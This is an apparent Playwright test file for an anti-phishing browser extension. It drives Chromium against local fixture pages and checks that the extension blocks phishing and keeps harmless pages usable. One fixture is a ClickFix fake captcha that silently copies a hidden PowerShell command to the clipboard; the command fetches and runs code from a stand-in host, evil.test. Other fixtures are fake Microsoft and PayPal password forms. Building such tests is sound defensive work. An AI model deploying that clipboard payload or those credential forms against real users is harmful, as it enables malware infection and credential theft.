/**
 * Loads the built extension (dist/) into Chromium and drives real navigations.
 * Every hostname resolves to a local fixture server (--host-resolver-rules), so no
 * request ever reaches a real phishing host.
 */
import { test, expect, chromium, type BrowserContext, type Worker } from "@playwright/test";
import { createServer, type Server } from "node:http";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

const dist = resolve(process.cwd(), "dist");

const PAGES: Record<string, string> = {
  "/clean": "<!doctype html><title>Weather today</title><h1>Sunny</h1><p>Nothing to see.</p>",
  "/start": `<!doctype html><title>Sign in to your Microsoft account</title>
    <form action="/collect" method="post"><input type="email" name="loginfmt"><input type="password" name="passwd"><button>Sign in</button></form>`,
  "/clickfix": `<!doctype html><title>Just a moment</title>
    <h1>Verify you are human</h1><p>1. Press Windows + R  2. Press Ctrl + V  3. Press Enter</p>
    <button id="verify" onclick="var t=document.createElement('textarea');t.value='powershell -w hidden -c iex(irm http://evil.test/p)';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">I'm not a robot</button>`,
  "/installer": `<!doctype html><title>Install</title><h1>Install the CLI</h1>
    <button id="copy" onclick="var t=document.createElement('textarea');t.value='curl -fsSL https://example.test/install.sh | sh';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">Copy</button>`,
  "/account": `<!doctype html><title>Sign in</title>
    <form action="/session" method="post"><input type="email" name="email"><input type="password" name="password"><button>Sign in</button></form>`,
  "/dl": `<!doctype html><title>Downloads</title><a id="dl" href="/setup.exe" download>Download</a>`,
};

let server: Server;
let port = 0;
let context: BrowserContext;
let worker: Worker;
let profile = "";

test.beforeAll(async () => {
  server = createServer((req, res) => {
    const path = (req.url ?? "/").split("?")[0] ?? "/";
    if (path === "/setup.exe") {
      res.writeHead(200, { "Content-Type": "application/octet-stream", "Content-Disposition": 'attachment; filename="setup.exe"' });
      res.end(Buffer.alloc(64 * 1024, 1));
      return;
    }
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(PAGES[path] ?? PAGES["/clean"]);
  });
  await new Promise<void>((done) => server.listen(0, "127.0.0.1", () => done()));
  const address = server.address();
  port = typeof address === "object" && address ? address.port : 0;

  profile = mkdtempSync(join(tmpdir(), "fundament-e2e-"));
  // FUNDAMENT_E2E_BROWSER: path to a Chromium-based browser that still accepts --load-extension
  // (Playwright's Chromium by default; Edge works when security software quarantines it).
  const executablePath = process.env.FUNDAMENT_E2E_BROWSER || undefined;
  context = await chromium.launchPersistentContext(profile, {
    ...(executablePath ? { executablePath } : { channel: "chromium" }),
    headless: true,
    acceptDownloads: true,
    args: [
      `--disable-extensions-except=${dist}`,
      `--load-extension=${dist}`,
      "--host-resolver-rules=MAP * 127.0.0.1",
    ],
  });
  worker = context.serviceWorkers()[0] ?? (await context.waitForEvent("serviceworker"));
  // Let onInstalled finish applying rulesets.
  await expect.poll(async () => worker.evaluate(async () => (await chrome.declarativeNetRequest.getEnabledRulesets()).length)).toBeGreaterThan(3);
});

test.afterAll(async () => {
  await context?.close();
  server?.close();
  if (profile) rmSync(profile, { recursive: true, force: true });
});

async function freshPage() {
  const page = await context.newPage();
  return page;
}

test("an ordinary page loads without an interstitial", async () => {
  const page = await freshPage();
  await page.goto(`http://weather-news.example:${port}/clean`);
  await page.waitForTimeout(800);
  expect(page.url()).toContain("/clean");
  await page.close();
});

test("a brand-lookalike sign-in URL is stopped before the page is used", async () => {
  const page = await freshPage();
  await page.goto(`http://paypal-login.secure-check.xyz:${port}/signin`).catch(() => undefined);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await expect(page.locator(".host")).toContainText("paypal-login.secure-check.xyz");
  await page.close();
});

test("a page that claims to be Microsoft and asks for a password is stopped", async () => {
  const page = await freshPage();
  await page.goto(`http://account-portal.example:${port}/start`);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.locator("button.ghost", { hasText: /why|warum/i }).click();
  await expect(page.locator(".why")).toContainText(/brand-content/);
  await page.close();
});

test("a ClickFix fake captcha cannot put its command on the clipboard", async () => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  const page = await freshPage();
  await page.goto(`http://cdn-check.example:${port}/clickfix`);
  await page.locator("#verify").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.close();
});

test("the worker loads the popularity list: a brand's secondary domain is not a lookalike", async () => {
  const page = await freshPage();
  await page.goto(`http://netflix.net:${port}/clean`);
  await page.waitForTimeout(1200);
  const ids = await worker.evaluate(async () => {
    const all = await chrome.storage.session.get(null);
    const record = Object.values(all).find((v) => (v as { url?: string }).url?.includes("netflix.net")) as
      | { analysis?: { signals: { id: string; weightApplied: number }[] } }
      | undefined;
    return (record?.analysis?.signals ?? []).filter((s) => s.id === "popular" || s.weightApplied > 0).map((s) => s.id);
  });
  expect(ids).toContain("popular");
  expect(ids).not.toContain("impersonation");
  await page.close();
});

test("a kit on a popular platform does not borrow the platform's reputation", async () => {
  const page = await freshPage();
  await page.goto(`http://paypal-login.weebly.com:${port}/account`).catch(() => undefined);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.close();
});

test("a real installer copy button on a normal page is left alone", async () => {
  const page = await freshPage();
  await page.goto(`http://tool-docs.example:${port}/installer`);
  await page.locator("#copy").click();
  await page.waitForTimeout(1200);
  expect(page.url()).toContain("/installer");
  await page.close();
});

test("a host from the shipped phishing feed is redirected, and Continue works", async () => {
  const feed = readFileSync(resolve(process.cwd(), "filters/feeds/phishing-hosts.txt"), "utf8").split("\n");
  const host = feed.find((h) => /^[a-z0-9-]+\.[a-z]{2,}$/.test(h) && !h.endsWith(".example")) ?? feed[0];
  const page = await freshPage();
  await page.goto(`http://${host}:${port}/clean`).catch(() => undefined);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html?blocked=feed");
  await expect(page.locator(".reason")).toContainText(/phishing/i);
  await page.locator("button.continue").click();
  await page.locator("button.continue.danger").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain(`${host}:${port}/clean`);
  await page.close();
});

test("a program downloaded over plain HTTP is cancelled", async () => {
  const page = await freshPage();
  await page.goto(`http://files.example:${port}/dl`);
  await page.locator("#dl").click();
  await expect
    .poll(
      async () =>
        worker.evaluate(async () => {
          const items = await chrome.downloads.search({});
          return items.length === 0 ? "erased" : items.map((i) => i.state).join(",");
        }),
      { timeout: 8000 },
    )
    .toMatch(/erased|interrupted/);
  await page.close();
});
